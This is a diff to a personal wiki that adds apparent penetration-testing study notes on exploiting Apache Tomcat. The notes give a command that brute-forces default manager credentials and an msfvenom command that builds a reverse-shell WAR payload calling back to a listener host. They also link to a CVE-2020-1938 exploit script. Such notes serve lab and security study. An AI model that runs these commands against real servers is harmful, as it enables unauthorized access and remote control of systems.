@@ -349,6 +349,8 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 
 <li>TODO</li>
 
+<li>Tomcat</li>
+
 <li>Unity</li>
 
 <li>Unity Animation</li>
@@ -9660,7 +9662,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211010110956799" list="[[Cyber Security]] [[Network Services]] CrappyMakerProgrammer" modified="20211010110958181" title="$:/StoryList">
+<div created="20211010110956799" list="[[Cyber Security]] [[Network Services]] Tomcat CrappyMakerProgrammer" modified="20211010111009029" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -11901,6 +11903,37 @@ PRIORITY: Do CoSpace soon
 # Content Page
 # First Layer Deep (Outline)
 # Sports</pre>
+</div>
+<div created="20211010111016770" modified="20211010113330473" title="Tomcat">
+<pre>! Exploitation
+
+
+!! Default passwords (HIGHLY LIKELY)
+
+You can brute force the default passwords with this tool. [[tomcat_bruteforce.py|https://gist.github.com/th3gundy/d562eb1ae5dc42d666d3aab761bd4d96#file-tomcat_bruteforce-py]]
+
+```
+python tomcat_bruteforce.py --host 10.10.10.95 --port 8080 --usr /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt --pwd /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt 
+```
+
+!! Upload Reverse Shell
+
+Metasploit guide on it [[here|https://vk9-sec.com/apache-tomcat-manager-war-reverse-shell/]]
+
+You can generate a reverse shell payload (`.war` file), and upload it at `/manager/html/upload`
+
+```
+┌──(kali㉿kali)-[/tmp]
+└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.12 LPORT=1111 -f war &gt; shell.war
+Payload size: 1090 bytes
+Final size of war file: 1090 bytes
+```
+
+!! CVEs
+
+!! Resources
+
+#  https://github.com/xindongzhuaizhuai/CVE-2020-1938/blob/master/CVE-2020-1938.py </pre>
 </div>
 <div created="20191105043109254" modified="20210925100050353" tags="[[Game Development]]" title="Unity">
 <pre>! Scripting
